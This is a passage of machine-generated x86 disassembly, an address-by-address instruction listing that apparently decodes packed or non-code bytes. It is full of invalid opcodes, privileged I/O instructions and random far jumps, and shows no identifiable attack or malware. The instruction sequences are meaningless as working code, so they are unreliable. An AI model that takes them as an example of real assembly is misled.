  41f6be:	sub    al,0x5f
  41f6c0:	stos   BYTE PTR es:[edi],al
  41f6c1:	test   BYTE PTR [ebx],bh
  41f6c3:	adc    al,0x94
  41f6c5:	repz mov eax,DWORD PTR [eax-0x2d058dd8]
  41f6cc:	sti    
  41f6cd:	fwait
  41f6ce:	xchg   esp,edx
  41f6d0:	push   0x659f7f71
  41f6d5:	pusha  
  41f6d6:	sub    eax,0x46f5f17f
  41f6db:	dec    ebp
  41f6dc:	retf   
  41f6dd:	popf   
  41f6de:	into   
  41f6df:	fbstp  TBYTE PTR [edx]
  41f6e1:	jns    0x41f6a2
  41f6e3:	sbb    ch,BYTE PTR [ecx-0x26]
  41f6e6:	dec    ebp
  41f6e7:	popa   
  41f6e8:	push   cs
  41f6e9:	mov    BYTE PTR [ecx],bl
  41f6eb:	and    esi,DWORD PTR gs:[ecx+0x144679cb]
  41f6f2:	cs fcmovnu st,st(5)
  41f6f5:	push   edx
  41f6f6:	shl    bh,cl
  41f6f8:	mov    dl,ch
  41f6fa:	push   edx
  41f6fb:	gs add eax,0x4dfa9199
  41f701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f702:	pop    esp
  41f703:	cmc    
  41f704:	jl     0x41f726
  41f706:	xor    DWORD PTR [ebp+0x3e5df4d3],edx
  41f70c:	dec    eax
  41f70d:	in     al,0x31
  41f70f:	sub    ecx,DWORD PTR [ecx-0x3d89fa08]
  41f715:	pop    esi
  41f716:	lahf   
  41f717:	add    ecx,DWORD PTR [ebx+0x12]
  41f71a:	shl    BYTE PTR [esi-0x75],cl
  41f71d:	adc    al,0xc0
  41f71f:	sub    al,0xda
  41f721:	add    al,0x75
  41f723:	push   edx
  41f724:	retf   0xd54b
  41f727:	push   es
  41f728:	xabort 0xfc
  41f72b:	(bad)  
  41f72c:	stos   BYTE PTR es:[edi],al
  41f72d:	aad    0x5b
  41f72f:	sub    ecx,ebp
  41f731:	std    
  41f732:	out    0x7d,eax
  41f734:	mov    eax,0x14c5370d
  41f739:	push   es
  41f73a:	nop
  41f73b:	jecxz  0x41f731
  41f73d:	popf   
  41f73e:	test   al,0xad
  41f740:	in     al,dx
  41f741:	push   0x849e0b77
  41f746:	pop    ds
  41f747:	push   ecx
  41f748:	jae    0x41f6e3
  41f74a:	sub    BYTE PTR [ebx+ebp*8+0x6deec232],0x28
  41f752:	test   eax,0xd445a94f
  41f757:	xchg   esi,eax
  41f758:	sbb    DWORD PTR [ecx],0x14
  41f75b:	cmp    eax,0x8048f637
  41f760:	in     al,dx
  41f761:	mov    bl,0x92
  41f763:	push   ebp
  41f764:	sub    al,0xec
  41f766:	mov    BYTE PTR [ebp-0x1a11277c],dl
  41f76c:	icebp  
  41f76d:	hlt    
  41f76e:	in     al,0x2a
  41f770:	push   edi
  41f771:	(bad)  
  41f772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f773:	shr    bl,1
  41f775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f776:	jmp    0x459f:0xd645c7fd
  41f77d:	in     eax,dx
  41f77e:	jg     0x41f7bf
  41f780:	inc    ebx
  41f781:	push   ebx
  41f782:	into   
  41f783:	addr16 repz xchg esi,eax
  41f786:	scas   al,BYTE PTR es:[edi]
  41f787:	shr    BYTE PTR [esi+0x11],cl
  41f78a:	mov    edi,0xe7e43f4f
  41f78f:	mov    edx,0xd325bfc8
  41f794:	stos   BYTE PTR es:[edi],al
  41f795:	lahf   
  41f796:	xlat   BYTE PTR ds:[ebx]
  41f798:	xchg   ebx,eax
  41f799:	xchg   BYTE PTR [eax+0x50550dfe],bh
  41f79f:	mov    gs,WORD PTR [eax-0x4e]
  41f7a2:	(bad)  
  41f7a3:	jmp    0x41f7e8
  41f7a5:	popw   ss
  41f7a7:	mov    cl,0x88
  41f7a9:	adc    BYTE PTR [ecx-0x1c87c37b],bh
  41f7af:	jne    0x41f756
  41f7b1:	sbb    al,BYTE PTR [esi-0x6cc434ed]
  41f7b7:	int3   
  41f7b8:	ss jae 0x41f760
  41f7bb:	js     0x41f7ab
  41f7bd:	push   ss
  41f7be:	stos   DWORD PTR es:[edi],eax
  41f7bf:	popf   
  41f7c0:	mov    ds:0x1aaf80ef,eax
  41f7c5:	into   
  41f7c6:	ret    0xfe33
  41f7c9:	dec    esp
  41f7ca:	dec    esi
  41f7cb:	lods   eax,DWORD PTR ds:[esi]
  41f7cc:	jge    0x41f7b0
  41f7ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7cf:	hlt    
  41f7d0:	inc    edi
  41f7d1:	mov    DWORD PTR [edx+0x10],ebx
  41f7d4:	lods   eax,DWORD PTR ds:[esi]
  41f7d5:	or     BYTE PTR [edx-0x76],0x64
  41f7d9:	out    dx,al
  41f7da:	add    al,0x7b
  41f7dc:	cmp    esp,edi
  41f7de:	and    DWORD PTR [ebp-0x5a],ebx
  41f7e1:	aam    0x58
  41f7e3:	pusha  
  41f7e4:	mov    ebx,0x959f5149
  41f7e9:	xchg   ebx,eax
  41f7ea:	cli    
  41f7eb:	xchg   edx,eax
  41f7ec:	add    eax,0xddd46ff1
  41f7f1:	sbb    ecx,ecx
  41f7f3:	call   0x560d8346
  41f7f8:	arpl   WORD PTR [eax+edx*2+0x71],cx
  41f7fc:	push   ss
  41f7fd:	es adc al,0x34
  41f800:	ret    0xe4ff
  41f803:	xor    al,0xfd
  41f805:	push   esp
  41f806:	fcom   DWORD PTR [ebx+0x3c]
  41f809:	js     0x41f864
  41f80b:	mov    dl,0x51
  41f80d:	dec    esi
  41f80e:	or     dl,BYTE PTR [edi+ebp*8-0x6a]
  41f812:	xor    eax,0x230b01e0
  41f817:	push   ecx
  41f818:	jne    0x41f85d
  41f81a:	jbe    0x41f853
  41f81c:	stos   BYTE PTR es:[edi],al
  41f81d:	ret    
  41f81e:	mov    edi,0xd3dab3b4
  41f823:	dec    esp
  41f824:	fisubr DWORD PTR [eax]
  41f826:	(bad)
  41f829:	in     al,0x46
  41f82b:	mov    ds:0xb77fd6c,eax
  41f830:	leave  
  41f831:	push   ebp
  41f832:	imul   ecx,DWORD PTR [ecx+eiz*1-0x217e0d1f],0x18
  41f83a:	jge    0x41f80e
  41f83c:	idiv   BYTE PTR [ebx]
  41f83e:	add    DWORD PTR [esp+eax*8+0x2f],eax
  41f842:	sbb    DWORD PTR [edx],esp
  41f844:	std    
  41f845:	sub    al,BYTE PTR [edx+0x322d662]
  41f84b:	ret    
  41f84c:	pop    ebx
  41f84d:	mov    dh,0xf1
  41f84f:	mov    ebp,0xf4accc7f
  41f854:	sub    eax,0x210f2622
  41f859:	mov    ebx,0xbb229da9
  41f85e:	jno    0x41f858
  41f860:	xor    edi,esp
  41f862:	cmp    al,0xa1
  41f864:	cmp    eax,0x701110de
  41f869:	aas    
  41f86a:	test   BYTE PTR [eax+edx*2-0x42],0x18
  41f86f:	pushf  
  41f870:	sbb    bl,BYTE PTR [ecx-0x2a50547c]
  41f876:	and    al,0xc9
  41f878:	lahf   
  41f879:	(bad)
  41f87d:	fwait
  41f87e:	test   BYTE PTR [ebp*4-0x47aa5862],bh
  41f885:	mov    bh,0x70
  41f887:	or     ecx,DWORD PTR [edx-0x2bcc06ff]
  41f88d:	sahf   
  41f88e:	adc    esp,edx
  41f890:	mov    dl,cl
  41f892:	mov    ebx,0x7295e076
  41f897:	mov    al,ds:0x6d755b8a
  41f89c:	add    BYTE PTR [ecx],ch
  41f89e:	xor    BYTE PTR [ecx-0x41],cl
  41f8a1:	lahf   
  41f8a2:	imul   ebx,DWORD PTR [eax-0x24],0xffffffd5
  41f8a6:	mov    esp,0xda69009c
  41f8ab:	jg     0x41f90c
  41f8ad:	jp     0x41f8e8
  41f8af:	call   0x9fe44490
  41f8b4:	xor    DWORD PTR [edi],edi
  41f8b6:	nop
  41f8b7:	mov    esi,0x1dc85f17
  41f8bc:	inc    ebp
  41f8bd:	cmc    
  41f8be:	mov    WORD PTR [ecx-0x4a],cs
  41f8c1:	dec    edx
  41f8c2:	lahf   
  41f8c3:	mov    ds:0x52f1239c,eax
  41f8c8:	push   ecx
  41f8c9:	out    dx,al
  41f8ca:	inc    ebx
  41f8cb:	call   0xdf8:0x4778ee03
  41f8d2:	rcr    DWORD PTR [ebp-0x79],cl
  41f8d5:	ror    ebx,1
  41f8d7:	or     DWORD PTR [edx-0x23],ecx
  41f8da:	fisub  WORD PTR [ebx+0x3d]
  41f8dd:	jmp    FWORD PTR gs:[esi]
  41f8e0:	stos   DWORD PTR es:[edi],eax
  41f8e1:	lock and DWORD PTR [eax-0xfe3bc07],edi
  41f8e8:	sbb    DWORD PTR [eax-0x67],ecx
  41f8eb:	sahf   
  41f8ec:	xchg   esp,eax
  41f8ed:	push   DWORD PTR [ebp+0x6a]
  41f8f0:	into   
  41f8f1:	pop    ss
  41f8f2:	adc    bl,BYTE PTR [ecx+eiz*8]
  41f8f5:	mov    esi,0x90869592
  41f8fa:	sub    eax,0x1fb216e1
  41f8ff:	mov    ds:0x2e2ff651,al
  41f904:	adc    eax,0x428ec637
  41f909:	ret    0x1e9d
  41f90c:	into   
  41f90d:	mov    ebx,DWORD PTR [edx]
  41f90f:	jo     0x41f931
  41f911:	sar    BYTE PTR [edi+0x30034b9d],0xd
  41f918:	mov    dh,0xab
  41f91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f91b:	mov    al,ds:0x8b620553
  41f920:	inc    ebx
  41f921:	xchg   BYTE PTR [esp+eax*2+0x45564d24],dh
  41f928:	ins    DWORD PTR es:[edi],dx
  41f929:	aam    0x24
  41f92b:	pop    es
  41f92c:	call   0x6367483
  41f931:	push   esp
  41f932:	mov    ss,edi
  41f934:	test   BYTE PTR [edx-0x2a],0x76
  41f938:	adc    DWORD PTR [esi],esi
  41f93a:	imul   edi,DWORD PTR [ebx-0x58],0x77
  41f93e:	inc    edi
  41f93f:	adc    BYTE PTR [ecx],cl
  41f941:	cmp    eax,0xd927308b
  41f946:	jle    0x41f97c
  41f948:	(bad)  
  41f949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f94a:	fld    QWORD PTR [ecx+0x2c2c6306]
  41f950:	mov    ebx,0xfd571220
  41f955:	dec    ecx
  41f956:	jo     0x41f919
  41f958:	rcr    al,1
  41f95a:	imul   BYTE PTR [edi+0x5c8b5ab0]
  41f960:	adc    BYTE PTR [ebx+0xb],ah
  41f963:	(bad)  
  41f964:	cli    
  41f965:	push   ebx
  41f966:	mov    dl,0xbe
  41f968:	and    ah,al
  41f96a:	repz loope 0x41f95c
  41f96d:	in     al,0x5a
  41f96f:	(bad)  
  41f970:	sti    
  41f971:	cs inc ecx
  41f973:	xchg   ebx,eax
  41f974:	div    cl
  41f976:	stc    
  41f977:	out    dx,eax
  41f978:	fstp   DWORD PTR [esp+edx*1-0x16]
  41f97c:	dec    ebp
  41f97d:	das    
  41f97e:	sub    DWORD PTR [edx],0x6c
  41f981:	or     dh,al
  41f983:	xor    BYTE PTR ds:0xd6c4714c,ch
  41f989:	mov    ch,0xe9
  41f98b:	or     esi,ecx
  41f98d:	jo     0x41f9aa
  41f98f:	ror    ah,cl
  41f991:	stos   DWORD PTR es:[edi],eax
  41f992:	loop   0x41f9ae
  41f994:	scas   eax,DWORD PTR es:[edi]
  41f995:	sub    eax,DWORD PTR [ebp+0x7d059b40]
  41f99b:	push   eax
  41f99c:	and    al,BYTE PTR gs:[edx-0x23]
  41f9a0:	call   0x574:0x95a92ede
  41f9a7:	adc    eax,DWORD PTR [ebx+0x7a]
  41f9aa:	sub    eax,0x7941c4f9
  41f9af:	mov    al,ds:0xc2c6fe41
  41f9b4:	dec    ecx
  41f9b5:	ror    ecx,1
  41f9b7:	inc    esi
  41f9b8:	imul   edx,esi,0x57
  41f9bb:	sub    eax,ebp
  41f9bd:	hlt    
  41f9be:	push   edx
  41f9bf:	retf   
  41f9c0:	jmp    DWORD PTR [ecx-0x2f]
  41f9c3:	xor    DWORD PTR [eax],edi
  41f9c5:	jp     0x41f9fe
  41f9c7:	out    0x72,eax
  41f9c9:	loopne 0x41f986
  41f9cb:	sub    al,0x2f
  41f9cd:	mov    dl,0x67
  41f9cf:	ins    DWORD PTR es:[edi],dx
  41f9d0:	xor    al,0x4f
  41f9d2:	push   ss
  41f9d3:	push   eax
  41f9d4:	pop    edi
  41f9d5:	add    DWORD PTR [ebp+0x1b77e16d],0x5b090aab
  41f9df:	mov    ch,0x49
  41f9e1:	sbb    al,0x5f
  41f9e3:	js     0x41f98d
  41f9e5:	xchg   ebp,eax
  41f9e6:	leave  
  41f9e7:	ja     0x41fa12
  41f9e9:	inc    esi
  41f9ea:	popa   
  41f9eb:	mov    bh,0xb4
  41f9ed:	push   0x5b
  41f9ef:	inc    ebp
  41f9f0:	dec    ebp
  41f9f1:	mov    BYTE PTR [ebx],cl
  41f9f3:	out    0xf4,al
  41f9f5:	mov    edi,0xf7af98bb
  41f9fa:	mov    bl,0x21
  41f9fc:	xchg   esi,eax
  41f9fd:	pop    es
  41f9fe:	adc    al,0x1
  41fa00:	sar    DWORD PTR [ebx-0x5fb5152a],1
  41fa06:	fldenv [eax+0x3]
  41fa09:	popa   
  41fa0a:	xor    BYTE PTR [eax],ah
  41fa0c:	jmp    0x3da:0xea97580d
  41fa13:	xchg   ebx,eax
  41fa14:	jo     0x41fa42
  41fa16:	mov    al,ds:0x825ce95b
  41fa1b:	push   0xffffffd7
  41fa1d:	not    BYTE PTR [ebx-0x63]
  41fa20:	in     al,dx
  41fa21:	fs aam 0x3c
  41fa24:	adc    al,0x20
  41fa26:	adc    ecx,DWORD PTR [edx]
  41fa28:	ins    DWORD PTR es:[edi],dx
  41fa29:	fdivp  st(3),st
  41fa2b:	add    dh,BYTE PTR [edx+0x77a98d8d]
  41fa31:	dec    ecx
  41fa32:	jl     0x41fa40
  41fa34:	ds inc eax
  41fa36:	nop
  41fa37:	adc    esp,eax
  41fa39:	xchg   ebx,eax
  41fa3a:	ret    0xee8c
  41fa3d:	popa   
  41fa3e:	push   esp
  41fa3f:	mov    esi,cr5
  41fa42:	aad    0xb4
  41fa44:	rol    BYTE PTR [ecx],cl
  41fa46:	es pop eax
  41fa48:	push   esi
  41fa49:	nop
  41fa4a:	gs sbb eax,0xc8ea8b2c
  41fa50:	mov    ds:0x138dc46a,eax
  41fa55:	mov    edx,0x9b8a3c84
  41fa5a:	jae    0x41fa7f
  41fa5c:	adc    al,BYTE PTR [eax-0x1b14bf9f]
  41fa62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa63:	inc    edi
  41fa64:	es repz out 0xe7,eax
  41fa68:	mov    ecx,0xbd7770b7
  41fa6d:	jp     0x41fa97
  41fa6f:	push   edi
  41fa70:	push   ss
  41fa71:	ret    0x7cec
  41fa74:	dec    esi
  41fa75:	push   ecx
  41fa76:	imul   edx,DWORD PTR [edi],0x47
  41fa79:	fisub  DWORD PTR [esp+ebp*8-0x53a7510c]
  41fa80:	mov    eax,0xe6e533dc
  41fa85:	out    0x20,al
  41fa87:	test   DWORD PTR [eax+esi*2+0x20],esp
  41fa8b:	ins    BYTE PTR es:[edi],dx
  41fa8c:	jnp    0x41fa53
  41fa8e:	sbb    al,0x94
  41fa90:	xor    esp,edi
  41fa92:	std    
  41fa93:	add    bh,BYTE PTR [ebp+0x10]
  41fa96:	stos   DWORD PTR es:[edi],eax
  41fa97:	add    DWORD PTR [ebp+0x5e],ebx
  41fa9a:	dec    ebp
  41fa9b:	cmc    
  41fa9c:	test   eax,0x610d8d2d
  41faa1:	fmul   QWORD PTR [ebp-0x42399cc0]
  41faa7:	test   eax,0xac6c462b
  41faac:	in     al,0x4b
  41faae:	outs   dx,BYTE PTR ds:[esi]
  41faaf:	inc    eax
  41fab0:	les    ebp,FWORD PTR [ebx+0x63]
  41fab3:	pusha  
  41fab4:	sub    eax,0xa8be243a
  41fab9:	add    DWORD PTR [eax-0x64ea953a],ecx
  41fabf:	(bad)  
  41fac0:	loopne 0x41fa4c
  41fac2:	retf   
  41fac3:	loopne 0x41fb2f
  41fac5:	inc    ecx
  41fac6:	inc    edx
  41fac7:	fstp   QWORD PTR [esi-0x94fe0ad]
  41facd:	ja     0x41fab9
  41facf:	mov    ds:0x6aa01593,eax
  41fad4:	xchg   edx,eax
  41fad5:	or     dh,BYTE PTR [esp+eax*8+0xc]
  41fad9:	mov    esp,0xb8935a06
  41fade:	push   ecx
  41fadf:	adc    BYTE PTR [edi-0x53be7afd],bh
  41fae5:	nop
  41fae6:	fsub   DWORD PTR [eax-0x76]
  41fae9:	inc    esp
  41faea:	call   0x558252f0
  41faef:	jmp    0x6c788780
  41faf4:	ret    0xf6
  41faf7:	rcl    DWORD PTR [ebx],0x16
  41fafa:	sub    DWORD PTR [ebp-0x79c0eb07],0x9cfdd8d4
  41fb04:	in     al,0xdc
  41fb06:	ret    
  41fb07:	das    
  41fb08:	(bad)  
  41fb09:	jmp    0x41faff
  41fb0b:	dec    ecx
  41fb0c:	inc    ebp
  41fb0d:	rcr    BYTE PTR [ebx+0x309e3dbb],1
  41fb13:	pusha  
  41fb14:	dec    ecx
  41fb15:	outs   dx,DWORD PTR ds:[esi]
  41fb16:	fistp  DWORD PTR [esi+0x21821655]
  41fb1c:	inc    esi
  41fb1d:	loopne 0x41fb16
  41fb1f:	imul   ecx,DWORD PTR [ebx],0xffffffbd
  41fb22:	xchg   esi,eax
  41fb23:	inc    edx
  41fb24:	mov    cs,ebx
  41fb26:	int3   
  41fb27:	shr    esi,0xc1
  41fb2a:	sbb    BYTE PTR [edx],dh
  41fb2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb2d:	cwde   
  41fb2e:	mov    al,BYTE PTR [ecx-0x2deba9f9]
  41fb34:	adc    eax,0x28f8f75e
  41fb39:	mov    ch,0x5c
  41fb3b:	bound  esi,QWORD PTR [ebx-0x27fc7b0e]
  41fb41:	lea    eax,[ecx]
  41fb43:	mov    bh,0x2f
  41fb45:	popf   
  41fb46:	push   ecx
  41fb47:	xchg   esp,eax
  41fb48:	fsubr  DWORD PTR [esi]
  41fb4a:	fs xchg edx,eax
  41fb4c:	hlt    
  41fb4d:	sub    bh,BYTE PTR [edi+0x7a3c766d]
  41fb53:	inc    edi
  41fb54:	adc    eax,0x3ee96ae8
  41fb59:	int3   
  41fb5a:	ret    0x2667
  41fb5d:	push   esp
  41fb5e:	(bad)
  41fb61:	push   eax
  41fb62:	stos   BYTE PTR es:[edi],al
  41fb63:	mov    ch,bl
  41fb65:	dec    edi
  41fb66:	mov    bl,0x64
  41fb68:	ret    0x33a9
  41fb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb6c:	loope  0x41fbe4
  41fb6e:	ja     0x41fb93
  41fb70:	hlt    
  41fb71:	mov    al,ds:0x3b51aae3
  41fb76:	sbb    dh,BYTE PTR [ecx+0x14]
  41fb79:	ret    
  41fb7a:	add    dh,ch
  41fb7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb7d:	cmp    ch,BYTE PTR [ebx-0x5c50ae70]
  41fb83:	popa   
  41fb84:	jl     0x41fb71
  41fb86:	cmp    al,BYTE PTR ds:[ebx]
  41fb89:	fsub   DWORD PTR [edi]
  41fb8b:	inc    edi
  41fb8c:	jmp    0x41fbee
  41fb8e:	xor    cl,BYTE PTR [ebx+0x14]
  41fb91:	sbb    BYTE PTR [edi+ebp*2-0x76],al
  41fb95:	icebp  
  41fb96:	pop    edi
  41fb97:	shl    dh,1
  41fb99:	arpl   WORD PTR [ebp-0x19],ax
  41fb9c:	push   esi
  41fb9e:	outs   dx,DWORD PTR ds:[esi]
  41fb9f:	test   DWORD PTR [edi-0xc004fcd],eax
  41fba5:	fstp   QWORD PTR [ecx+ebx*4+0x48]
  41fba9:	mov    al,ds:0x5b19457b
  41fbae:	pop    eax
  41fbaf:	ret    
  41fbb0:	call   0x916e:0x76620e3d
  41fbb7:	adc    bh,BYTE PTR [esi]
  41fbb9:	in     eax,0x3d
  41fbbb:	lods   al,BYTE PTR ds:[esi]
  41fbbc:	call   0xa867:0x4d9b0507
  41fbc3:	jp     0x41fb9c
  41fbc5:	lds    ecx,FWORD PTR [ebp-0x22]
  41fbc8:	cmp    al,0xe1
  41fbca:	sbb    DWORD PTR [esi+eiz*2-0x39cafaa5],ebp
  41fbd1:	mov    dl,0x38
  41fbd3:	mov    edi,0xb86a6ca9
  41fbd8:	mov    ch,0xb0
  41fbda:	add    al,0x50
  41fbdc:	call   0x5138:0x399edde9
  41fbe3:	push   esp
  41fbe4:	fcomp  QWORD PTR [ebp-0x9ced09]
  41fbea:	repnz dec edi
  41fbec:	pop    esp
  41fbed:	add    al,ch
  41fbef:	(bad)  
  41fbf0:	shl    DWORD PTR [ebx],cl
  41fbf2:	or     ecx,DWORD PTR [ecx]
  41fbf4:	test   al,0xa7
  41fbf6:	mov    ch,0xf
  41fbf8:	cli    
  41fbf9:	add    eax,0xdcebe339
  41fbfe:	push   esp
  41fbff:	repnz ins DWORD PTR es:[edi],dx
  41fc01:	sub    edi,edx
  41fc03:	cmp    edi,ebp
  41fc05:	push   esp
  41fc06:	mov    WORD PTR [ebp-0x27e90f61],?
  41fc0c:	dec    ecx
  41fc0d:	xchg   ebp,eax
  41fc0e:	test   al,0xa3
  41fc10:	push   ecx
  41fc11:	es add al,0x3e
  41fc14:	(bad)  
  41fc15:	pushf  
  41fc16:	sti    
  41fc17:	add    al,0x50
  41fc19:	adc    DWORD PTR [edi+0x6c53f867],ebp
  41fc1f:	icebp  
  41fc20:	bnd jne 0x41fbcc
  41fc23:	pop    edx
  41fc24:	push   ebp
  41fc25:	jmp    0x6d20:0xcd4eb059
  41fc2c:	push   es
  41fc2d:	lods   eax,DWORD PTR ds:[esi]
  41fc2e:	mov    ds:0x50256e47,eax
  41fc33:	nop
  41fc34:	pop    edi
  41fc35:	loopne 0x41fbe7
  41fc37:	mov    bl,0xea
  41fc39:	jmp    0x41fc99
  41fc3b:	hlt    
  41fc3c:	push   ax
  41fc3e:	xor    ebx,ecx
  41fc40:	shl    DWORD PTR [edi],0x25
  41fc43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc44:	pushf  
  41fc45:	xlat   BYTE PTR ds:[ebx]
  41fc46:	or     al,0x0
  41fc48:	aaa    
  41fc49:	leave  
  41fc4a:	cmc    
  41fc4b:	xchg   ebx,eax
  41fc4c:	mov    ebx,DWORD PTR [esi-0x1383c198]
  41fc52:	lock ins BYTE PTR es:[edi],dx
  41fc54:	jle    0x41fcb1
  41fc56:	inc    edx
  41fc57:	and    al,0x62
  41fc59:	pop    esp
  41fc5a:	jb     0x41fc30
  41fc5c:	lods   eax,DWORD PTR ds:[esi]
  41fc5d:	shr    esp,cl
  41fc5f:	(bad)  
  41fc60:	hlt    
  41fc61:	or     al,0x8f
  41fc63:	mov    eax,ds:0x1fc7828a
  41fc68:	xchg   ebp,eax
  41fc69:	add    al,0x9e
  41fc6b:	push   0x71
  41fc6d:	add    al,0x3b
  41fc6f:	and    al,0xba
  41fc71:	sbb    eax,0x4db5dfab
  41fc76:	test   eax,0xc92ffb7d
  41fc7b:	mov    eax,ds:0x5d365405
  41fc80:	mov    eax,ds:0x16456295
  41fc85:	pop    ecx
  41fc86:	adc    eax,DWORD PTR [ebx+0x4ba2349b]
  41fc8c:	mov    ss,WORD PTR [ecx-0x33963eb]
  41fc92:	add    eax,0xa25922dc
  41fc97:	call   0x2b3136e8
  41fc9c:	shl    edi,cl
  41fc9e:	inc    edx
  41fc9f:	iret   
  41fca0:	(bad)  
  41fca1:	mov    bh,0xbd
  41fca3:	call   0x7423:0x504f46d1
  41fcaa:	pusha  
  41fcab:	mov    ebx,0xbde425bd
  41fcb0:	lds    ebp,FWORD PTR [edx]
  41fcb2:	xchg   ebx,eax
  41fcb3:	mov    edx,0x3d6cf2a8
  41fcb8:	xchg   ecx,eax
  41fcb9:	lahf   
  41fcba:	dec    ecx
  41fcbb:	shl    DWORD PTR [ebp-0x39],1
  41fcbe:	inc    esi
  41fcbf:	and    BYTE PTR [ebp+0x29],0xc7
  41fcc3:	cmp    eax,0xed796514
  41fcc8:	neg    BYTE PTR [eax+0x19842b77]
  41fcce:	add    eax,0x402304f2
  41fcd3:	cdq    
  41fcd4:	sbb    DWORD PTR [ebx-0x5be5763],ebp
  41fcda:	sbb    edi,ebp
  41fcdc:	test   eax,0x4d726c21
  41fce1:	aad    0xf1
  41fce3:	add    ecx,DWORD PTR [ebx-0x57d9c6a1]
  41fce9:	xor    al,0x12
  41fceb:	int    0x7c
  41fced:	sbb    esi,ebx
  41fcef:	clc    
  41fcf0:	sbb    BYTE PTR [edx+0x22],cl
  41fcf3:	fwait
  41fcf4:	cli    
  41fcf5:	cmp    al,0x94
  41fcf7:	adc    eax,0x97d87df7
  41fcfc:	jmp    0x1b4a:0x83224e1f
  41fd03:	sub    ecx,ecx
  41fd05:	cmp    ebp,ebp
  41fd07:	sub    esi,edx
  41fd09:	push   esp
  41fd0a:	sub    eax,0x3aa54fb
  41fd0f:	inc    ebp
  41fd10:	scas   eax,DWORD PTR es:[edi]
  41fd11:	sbb    dh,BYTE PTR [edx+ecx*1-0x39]
  41fd15:	mov    gs,ebx
  41fd17:	stos   DWORD PTR es:[edi],eax
  41fd18:	jo     0x41fd7a
  41fd1a:	pop    edi
  41fd1b:	sbb    eax,0x861f9da9
  41fd20:	std    
  41fd21:	sub    BYTE PTR [ebx-0x57],dl
  41fd24:	aas    
  41fd25:	adc    BYTE PTR [edx+eiz*2+0x3f11ad31],ch
  41fd2c:	lds    ebx,FWORD PTR [ebp+0x1c]
  41fd2f:	jae    0x41fccf
  41fd31:	cs loop 0x41fdaa
  41fd34:	sbb    eax,0x7f4ca5b
  41fd39:	adc    esi,ebx
  41fd3b:	mov    al,ds:0x5be82301
  41fd40:	xlat   BYTE PTR ds:[ebx]
  41fd41:	jl     0x41fda1
  41fd43:	mov    bl,0x7e
  41fd45:	mov    eax,ds:0x9b179fc6
  41fd4a:	inc    ebx
  41fd4b:	je     0x41fd75
  41fd4d:	fild   DWORD PTR [ecx+0x71]
  41fd50:	sub    ebp,DWORD PTR [esi+0x3c]
  41fd53:	pop    eax
  41fd54:	stos   DWORD PTR es:[edi],eax
  41fd55:	adc    dh,BYTE PTR [ebp+0x18c167c0]
  41fd5b:	stos   BYTE PTR es:[edi],al
  41fd5c:	and    eax,eax
  41fd5e:	into   
  41fd5f:	(bad)  
  41fd61:	cwde   
  41fd62:	ins    BYTE PTR es:[edi],dx
  41fd63:	bound  edx,QWORD PTR [ebx+0x39]
  41fd66:	cmp    cl,dl
  41fd68:	js     0x41fcf1
  41fd6a:	(bad)  
  41fd6b:	mov    edi,0x6507baf9
  41fd70:	xor    eax,0xf20ddb40
  41fd75:	neg    DWORD PTR [ecx-0x2f]
  41fd78:	jge    0x41fd79
  41fd7a:	dec    ebp
  41fd7b:	lods   al,BYTE PTR ds:[esi]
  41fd7c:	cmp    eax,0x29f2eb51
  41fd81:	js     0x41fde2
  41fd83:	lods   al,BYTE PTR ds:[esi]
  41fd84:	std    
  41fd85:	jno    0x41fd1c
  41fd87:	and    ah,dh
  41fd89:	adc    al,0xd2
  41fd8b:	xor    DWORD PTR [edx],esi
  41fd8d:	pop    edx
  41fd8e:	adc    BYTE PTR [ebx+ecx*8-0x7902255e],0x1f
  41fd96:	mov    ch,0x3
  41fd98:	lods   al,BYTE PTR ds:[esi]
  41fd99:	sbb    DWORD PTR [esi-0x7f],ebx
  41fd9c:	in     eax,dx
  41fd9d:	xor    BYTE PTR [esi-0x46],bh
  41fda0:	sbb    BYTE PTR [eax-0x76],cl
  41fda3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fda4:	or     DWORD PTR [edx+0x706a8c67],0xfffffffe
  41fdab:	xchg   BYTE PTR [ecx+0x607defb1],al
  41fdb1:	jb     0x41fde8
  41fdb3:	loopne 0x41fd4f
  41fdb5:	xor    al,0xa0
  41fdb7:	(bad)  
  41fdb8:	cs push edi
  41fdba:	sbb    bh,BYTE PTR [esi+0x7d3a15b2]
  41fdc0:	retf   0x68fb
  41fdc3:	add    BYTE PTR [edi-0x20],al
  41fdc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc7:	jmp    0x41fdf4
  41fdc9:	adc    BYTE PTR [ecx],0x74
  41fdcc:	sub    DWORD PTR [edi-0x29],ebx
  41fdcf:	jno    0x41fe41
  41fdd1:	adc    ecx,DWORD PTR [ebx-0x7ac1adca]
  41fdd7:	cwde   
  41fdd8:	outs   dx,BYTE PTR ds:[esi]
  41fdd9:	mov    cl,BYTE PTR [esi+0x5fd33f0d]
  41fddf:	int    0x76
  41fde1:	mov    eax,ds:0x36160d71
  41fde6:	in     eax,dx
  41fde7:	aaa    
  41fde8:	cmp    dl,BYTE PTR [edx+0x48]
  41fdeb:	sub    eax,0x991faa24
  41fdf0:	add    edi,eax
  41fdf2:	cdq    
  41fdf3:	cmp    DWORD PTR [ecx-0x3ff3b94e],eax
  41fdf9:	aaa    
  41fdfa:	inc    edx
  41fdfb:	(bad)  
  41fdfc:	not    DWORD PTR [eax]
  41fdfe:	and    esi,edi
  41fe00:	js     0x41fdb1
  41fe02:	inc    eax
  41fe03:	adc    BYTE PTR [edx],ah
  41fe05:	and    bl,BYTE PTR [edx-0x6e]
  41fe08:	dec    edx
  41fe09:	or     al,BYTE PTR [ecx+0x4d37f24f]
  41fe0f:	pop    ebp
  41fe10:	inc    ebx
  41fe11:	(bad)  
  41fe12:	and    DWORD PTR [edi],ebx
  41fe14:	lahf   
